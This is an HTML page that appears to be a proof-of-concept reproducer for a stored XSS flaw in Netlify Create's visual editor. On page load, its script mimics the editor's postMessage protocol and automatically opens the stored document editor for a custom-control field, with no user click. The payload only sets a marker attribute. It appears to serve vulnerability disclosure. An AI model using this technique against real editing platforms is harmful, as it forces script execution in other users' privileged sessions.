
<!-- trigger preview deploy 2026-10-14 -->
<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Stored Create XSS proof</title>
  </head>
  <body>
    <main data-sb-object-id="content/index.json">
      <h1 data-sb-field-path="title">Stored XSS Proof</h1>
      <p data-sb-field-path="description">Harmless marker test</p>
  <p data-sb-field-path="customControl">Custom control page-load trigger</p>
      <img data-sb-field-path="heroImage" src="/assets/safe.png" alt="Safe test image">
    </main>
    <script>
      // Harmless owned-project page-load reproducer. The preview speaks the
      // same message protocol as Netlify Create's visual-editing snippet so
      // the stored document editor opens without a manual click.
      (() => {
        if (parent === window) return;

        const TOP = 'https://create.netlify.com';
        const documentRef = {
          srcObjectId: 'content/index.json',
          srcType: 'git',
          srcProjectId: '9a0364b9'
        };
        const pending = new Map();
        let sequence = 0;
        let mounted = false;
        let editTimer;
        let editWatchdog;
        let editInFlight = null;

        const id = () => `stored-page-load-${Date.now()}-${++sequence}`;
        const send = (type, data, kind) => {
          const requestId = id();
          if (kind) pending.set(requestId, kind);
          parent.postMessage(JSON.stringify({ type, id: requestId, data }), TOP);
          return requestId;
        };
        const respond = (request, data = true) => {
          parent.postMessage(
            JSON.stringify({ type: 'response', id: id(), response: request.id, data }),
            TOP
          );
        };
        const requestEdit = () => {
          if (mounted || editInFlight) return;
          editInFlight = send(
            'actionButtonClicked',
            {
              button: 'edit',
              fieldPath: [documentRef.srcObjectId, 'fields', 'customControl'],
              xpath: '/html/body/main/p[2]'
            },
            'edit'
          );
          clearTimeout(editWatchdog);
          editWatchdog = setTimeout(() => {
            if (mounted || !editInFlight) return;
            pending.delete(editInFlight);
            editInFlight = null;
            retryEdit(700);
          }, 3500);
        };
        const retryEdit = (delay = 450) => {
          if (mounted || editInFlight) return;
          clearTimeout(editTimer);
          editTimer = setTimeout(requestEdit, delay);
        };
        const markMounted = () => {
          mounted = true;
          editInFlight = null;
          clearTimeout(editTimer);
          clearTimeout(editWatchdog);
          document.documentElement.setAttribute('data-page-load-editor-opened', 'confirmed');
        };

        addEventListener('message', (event) => {
          if (event.origin !== TOP || event.source !== parent || typeof event.data !== 'string') return;
          let message;
          try {
            message = JSON.parse(event.data);
          } catch {
            return;
          }

          // The parent gates normal frame setup on this request resolving.
          if (message.type === 'verifyOrigin') {
            respond(message, true);
            return;
          }

          if (message.type === 'navigate') {
            history.replaceState(null, '', message.data?.url || message.data?.path || '/');
            respond(message, true);
            retryEdit();
            return;
          }

          if (message.type === 'setCurrentPageId' || message.type === 'setSettings') {
            respond(message, true);
            retryEdit();
            return;
          }

          if (message.type === 'setOutlineButtonsState') {
            // A button-state update only proves the request started. It can arrive
            // before Create has loaded the object and before the editor exists.
            respond(message, true);
            return;
          }

          if (message.type !== 'response' || !pending.has(message.response)) return;
          const kind = pending.get(message.response);
          pending.delete(message.response);

          if (kind === 'ready') {
            send('clickReferencedObjects', { referencedObject: documentRef }, 'reference');
            retryEdit();
          } else if (kind === 'reference') {
            retryEdit();
          } else if (kind === 'edit') {
            if (message.response === editInFlight) editInFlight = null;
            clearTimeout(editWatchdog);
            if (message.error) {
              retryEdit();
            } else {
              markMounted();
            }
          }
        });

        send('ready', { path: '/' }, 'ready');
        setTimeout(() => {
          send('clickReferencedObjects', { referencedObject: documentRef }, 'reference');
          retryEdit();
        }, 1800);
      })();
    </script>
  </body>
</html>
